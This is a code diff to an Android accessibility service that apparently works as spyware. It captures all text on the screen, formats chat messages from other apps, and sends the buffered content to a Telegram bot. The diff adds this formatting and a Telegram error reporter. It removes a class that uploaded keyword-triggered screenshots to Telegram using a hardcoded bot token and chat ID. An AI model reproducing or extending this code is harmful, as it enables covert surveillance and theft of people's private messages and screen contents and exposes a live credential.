@@ -98,13 +98,43 @@ public class MyAccessibilityService extends AccessibilityService {
         }
     }
 
+    private String formatScreenText(String rawText) {
+        String[] lines = rawText.split("\\r?\\n");
+        StringBuilder formatted = new StringBuilder();
+
+        String lastHeader = "";
+        for (String line : lines) {
+            line = line.trim();
+
+            if (line.isEmpty()) continue;
+
+            // Jika line mengandung jam, anggap sebagai header pesan/chat
+            if (line.matches(".*\\b\\d{1,2}\\.\\d{2}\\b.*")) {
+                formatted.append("\n📨 ").append(line).append("\n");
+                lastHeader = line;
+            } else {
+                formatted.append("    └ ").append(line).append("\n");
+            }
+        }
+
+        return formatted.toString().trim();
+    }
+
+
+    private void sendErrorToTelegram(String errorMessage) {
+        new MessageSender().execute("❌ ERROR:\n" + errorMessage);
+    }
+
+
     private void logAllTexts() {
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
         if (rootNode != null) {
             StringBuilder stringBuilder = new StringBuilder();
             traverseNode(rootNode, stringBuilder);
             String allTexts = stringBuilder.toString();
-            Log.d(TAG, "Texts displayed on the screen: \n " + allTexts);
+            String formattedText = formatScreenText(allTexts);
+            Log.d(TAG, "Formatted Screen Content:\n" + formattedText);
+
 
             long currentTime = System.currentTimeMillis();
             // Remove expired entries
@@ -118,7 +148,9 @@ public class MyAccessibilityService extends AccessibilityService {
 
             // Append the texts to the buffer if they haven't been sent before
             if (!sentTexts.containsKey(allTexts)) {
-                currentKeyEvents.append("📱 Screen Content:\n").append(allTexts).append("\n");
+
+                currentKeyEvents.append("📱 Screen Content:\n").append(formattedText).append("\n");
+
                 sentTexts.put(allTexts, currentTime);
 
                 // Check buffer size and send if it exceeds MAX_BUFFER_SIZE
@@ -198,7 +230,6 @@ public class MyAccessibilityService extends AccessibilityService {
                             byte[] imageBytes = baos.toByteArray();
 
                             // Send screenshot with context
-                            sendScreenshotToTelegram(imageBytes, contextText);
 
                             bitmap.recycle();
                         }
@@ -217,9 +248,7 @@ public class MyAccessibilityService extends AccessibilityService {
         }
     }
 
-    private void sendScreenshotToTelegram(byte[] imageBytes, String contextText) {
-        new ScreenshotSender().execute(imageBytes, contextText);
-    }
+
 
     private void traverseNode(AccessibilityNodeInfo node, StringBuilder stringBuilder) {
         if (node == null) return;
@@ -451,58 +480,5 @@ public class MyAccessibilityService extends AccessibilityService {
         }
     }
 
-    private static class ScreenshotSender extends AsyncTask<Object, Void, Void> {
-        private static final String TAG = "ScreenshotSender";
 
-        @Override
-        protected Void doInBackground(Object... params) {
-            byte[] imageBytes = (byte[]) params[0];
-            String contextText = (String) params[1];
-
-            try {
-                String botNumber = "8044862489";
-                String secretKey = "AAG6N9nSl-mS5_qNoDB7AAwHp64VgRS_q_A";
-                String botToken = botNumber + ":" + secretKey;
-                String chatId = "584847845";
-                String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
-
-                URL url = new URL(urlString);
-                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                connection.setRequestMethod("POST");
-                connection.setRequestProperty("Content-Type", "application/json");
-                connection.setDoOutput(true);
-
-                // Convert image to base64
-                String base64Image = "";
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    base64Image = Base64.getEncoder().encodeToString(imageBytes);
-                }
-
-                String caption = "🔍 Screenshot triggered by keyword\n" +
-                        "🕐 Time: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()) + "\n" +
-                        "📝 Context: " + contextText;
-
-                JSONObject photoJSON = new JSONObject();
-                photoJSON.put("chat_id", chatId);
-                photoJSON.put("photo", "data:image/png;base64," + base64Image);
-                photoJSON.put("caption", caption);
-
-                OutputStream os = connection.getOutputStream();
-                os.write(photoJSON.toString().getBytes(StandardCharsets.UTF_8));
-                os.flush();
-                os.close();
-
-                int responseCode = connection.getResponseCode();
-                if (responseCode == HttpURLConnection.HTTP_OK) {
-                    Log.d(TAG, "Screenshot sent to Telegram chat.");
-                } else {
-                    Log.e(TAG, "Failed to send screenshot to Telegram chat. Response code: " + responseCode);
-                }
-                connection.disconnect();
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to send screenshot to Telegram chat: " + e.getMessage());
-            }
-            return null;
-        }
-    }
 }
